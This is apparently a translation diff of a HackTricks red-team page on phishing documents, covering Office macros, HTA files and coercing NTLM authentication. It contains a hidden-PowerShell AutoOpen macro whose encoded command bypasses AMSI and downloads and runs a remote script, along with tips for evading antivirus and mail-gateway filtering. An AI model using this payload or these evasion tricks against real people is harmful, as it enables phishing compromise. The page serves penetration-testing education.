@@ -15,39 +15,39 @@ Learn & practice GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" d
 </details>
 {% endhint %}
 
-## Office Dokumente
+## Office Documents
 
-Microsoft Word voer lêerdata-validasie uit voordat 'n lêer geopen word. Data-validasie word uitgevoer in die vorm van data-struktuuridentifikasie, teen die OfficeOpenXML-standaard. As enige fout tydens die data-struktuuridentifikasie voorkom, sal die lêer wat geanaliseer word nie geopen word nie.
+Microsoft Word 在打开文件之前会执行文件数据验证。数据验证以数据结构识别的形式进行，符合 OfficeOpenXML 标准。如果在数据结构识别过程中发生任何错误，正在分析的文件将无法打开。
 
-Gewoonlik gebruik Word-lêers wat makros bevat die `.docm` uitbreiding. Dit is egter moontlik om die lêer te hernoem deur die lêeruitbreiding te verander en steeds hul makro-uitvoeringsvermoëns te behou.\
-Byvoorbeeld, 'n RTF-lêer ondersteun nie makros nie, volgens ontwerp, maar 'n DOCM-lêer wat na RTF hernoem is, sal deur Microsoft Word hanteer word en sal in staat wees tot makro-uitvoering.\
-Die dieselfde interne meganismes geld vir alle sagteware van die Microsoft Office Suite (Excel, PowerPoint, ens.).
+通常，包含宏的 Word 文件使用 `.docm` 扩展名。然而，可以通过更改文件扩展名来重命名文件，并仍然保持其宏执行能力。\
+例如，RTF 文件设计上不支持宏，但重命名为 RTF 的 DOCM 文件将被 Microsoft Word 处理，并能够执行宏。\
+相同的内部机制适用于 Microsoft Office 套件的所有软件（Excel、PowerPoint 等）。
 
-Jy kan die volgende opdrag gebruik om te kyk watter uitbreidings deur sommige Office-programme uitgevoer gaan word:
+您可以使用以下命令检查某些 Office 程序将执行哪些扩展名：
 ```bash
 assoc | findstr /i "word excel powerp"
 ```
-DOCX-lêers wat 'n eksterne sjabloon verwys (Lêer – Opsies – Byvoegsels – Bestuur: Sjablone – Gaan) wat makros insluit, kan ook makros “uitvoer”.
+DOCX 文件引用远程模板（文件 - 选项 - 插件 - 管理：模板 - 转到）并包含宏也可以“执行”宏。
 
-### Eksterne Beeld Laai
+### 外部图像加载
 
-Gaan na: _Invoeg --> Vinne Onderdeel --> Veld_\
-&#xNAN;_**Kategoriewe**: Skakels en Verwysings, **Veldname**: includePicture, en **Lêernaam of URL**:_ http://\<ip>/whatever
+转到：_插入 --> 快速部件 --> 字段_\
+&#xNAN;_**类别**：链接和引用，**字段名称**：includePicture，以及 **文件名或 URL**:_ http://\<ip>/whatever
 
 ![](<../../.gitbook/assets/image (155).png>)
 
-### Makros Agterdeur
+### 宏后门
 
-Dit is moontlik om makros te gebruik om arbitrêre kode vanaf die dokument uit te voer.
+可以使用宏从文档中运行任意代码。
 
-#### Outomatiese laai funksies
+#### 自动加载函数
 
-Hoe meer algemeen hulle is, hoe meer waarskynlik sal die AV hulle opspoor.
+它们越常见，AV 检测到它们的可能性就越大。
 
 * AutoOpen()
 * Document\_Open()
 
-#### Makros Kode Voorbeelde
+#### 宏代码示例
 ```vba
 Sub AutoOpen()
 CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
@@ -77,26 +77,26 @@ Dim proc As Object
 Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
 proc.Create "powershell <beacon line generated>
 ```
-#### Verwyder metadata handmatig
+#### 手动删除元数据
 
-Gaan na **File > Info > Inspect Document > Inspect Document**, wat die Document Inspector sal oopbring. Klik op **Inspect** en dan **Remove All** langs **Document Properties and Personal Information**.
+转到 **文件 > 信息 > 检查文档 > 检查文档**，这将打开文档检查器。点击 **检查**，然后在 **文档属性和个人信息** 旁边点击 **全部删除**。
 
-#### Doc-uitbreiding
+#### 文档扩展名
 
-Wanneer jy klaar is, kies **Save as type** dropdown, verander die formaat van **`.docx`** na **Word 97-2003 `.doc`**.\
-Doen dit omdat jy **nie makro's binne 'n `.docx` kan stoor nie** en daar is 'n **stigma** **rondom** die makro-geaktiveerde **`.docm`** uitbreiding (bv. die miniatuurikoon het 'n groot `!` en sommige web/e-pos poorte blokkeer hulle heeltemal). Daarom is hierdie **erf `.doc` uitbreiding die beste kompromie**.
+完成后，选择 **另存为类型** 下拉菜单，将格式从 **`.docx`** 更改为 **Word 97-2003 `.doc`**。\
+这样做是因为你 **不能在 `.docx` 中保存宏**，并且 **`.docm`** 扩展名有一个 **污名**（例如，缩略图图标上有一个巨大的 `!`，一些网络/电子邮件网关完全阻止它们）。因此，这个 **遗留的 `.doc` 扩展名是最佳折衷**。
 
-#### Kwaadwillige Makro Generators
+#### 恶意宏生成器
 
 * MacOS
 * [**macphish**](https://github.com/cldrn/macphish)
 * [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)
 
-## HTA Lêers
+## HTA 文件
 
-'n HTA is 'n Windows-program wat **HTML en skriptaal (soos VBScript en JScript)** kombineer. Dit genereer die gebruikerskoppelvlak en voer uit as 'n "volledig vertroude" toepassing, sonder die beperkings van 'n blaaiers se sekuriteitsmodel.
+HTA 是一个 Windows 程序，它 **结合了 HTML 和脚本语言（如 VBScript 和 JScript）**。它生成用户界面并作为“完全信任”的应用程序执行，且不受浏览器安全模型的限制。
 
-'n HTA word uitgevoer met **`mshta.exe`**, wat tipies **geïnstalleer** word saam met **Internet Explorer**, wat **`mshta` afhanklik van IE** maak. So as dit verwyder is, sal HTA's nie in staat wees om uit te voer nie.
+HTA 通过 **`mshta.exe`** 执行，通常与 **Internet Explorer** 一起 **安装**，使得 **`mshta` 依赖于 IE**。因此，如果它被卸载，HTA 将无法执行。
 ```html
 <--! Basic HTA Execution -->
 <html>
@@ -151,11 +151,11 @@ var_func
 self.close
 </script>
 ```
-## Dwing NTLM-outeenteking
+## 强制 NTLM 认证
 
-Daar is verskeie maniere om **NTLM-outeenteking "afgeleë"** te **dwing**, byvoorbeeld, jy kan **on sigbare beelde** by e-posse of HTML voeg wat die gebruiker sal toegang hê tot (selfs HTTP MitM?). Of stuur die slagoffer die **adres van lêers** wat 'n **outeenteking** net vir **die oopmaak van die gids** sal **aktiveer**.
+有几种方法可以**“远程”强制 NTLM 认证**，例如，您可以在用户访问的电子邮件或 HTML 中添加**隐形图像**（甚至是 HTTP MitM？）。或者将**文件地址**发送给受害者，这将**触发**仅仅**打开文件夹**所需的**认证**。
 
-**Kyk na hierdie idees en meer op die volgende bladsye:**
+**在以下页面中查看这些想法和更多内容：**
 
 {% content-ref url="../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md" %}
 [printers-spooler-service-abuse.md](../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md)
@@ -165,24 +165,24 @@ Daar is verskeie maniere om **NTLM-outeenteking "afgeleë"** te **dwing**, byvoo
 [places-to-steal-ntlm-creds.md](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md)
 {% endcontent-ref %}
 
-### NTLM Relay
+### NTLM 中继
 
-Moet nie vergeet dat jy nie net die hash of die outeenteking kan steel nie, maar ook **NTLM relay-aanvalle** kan **uitvoer**:
+不要忘记，您不仅可以窃取哈希或认证，还可以**执行 NTLM 中继攻击**：
 
-* [**NTLM Relay-aanvalle**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
-* [**AD CS ESC8 (NTLM relay na sertifikate)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)
+* [**NTLM 中继攻击**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
+* [**AD CS ESC8 (NTLM 中继到证书)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)
 
 {% hint style="success" %}
-Leer & oefen AWS Hacking:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
-Leer & oefen GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+学习和实践 AWS 黑客技术：<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks 培训 AWS 红队专家 (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
+学习和实践 GCP 黑客技术：<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks 培训 GCP 红队专家 (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>Ondersteun HackTricks</summary>
+<summary>支持 HackTricks</summary>
 
-* Kyk na die [**subskripsie planne**](https://github.com/sponsors/carlospolop)!
-* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
-* **Deel hacking truuks deur PRs in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* 查看 [**订阅计划**](https://github.com/sponsors/carlospolop)!
+* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**电报群组**](https://t.me/peass) 或 **在** **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**上关注我们。**
+* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 来分享黑客技巧。
 
 </details>
 {% endhint %}
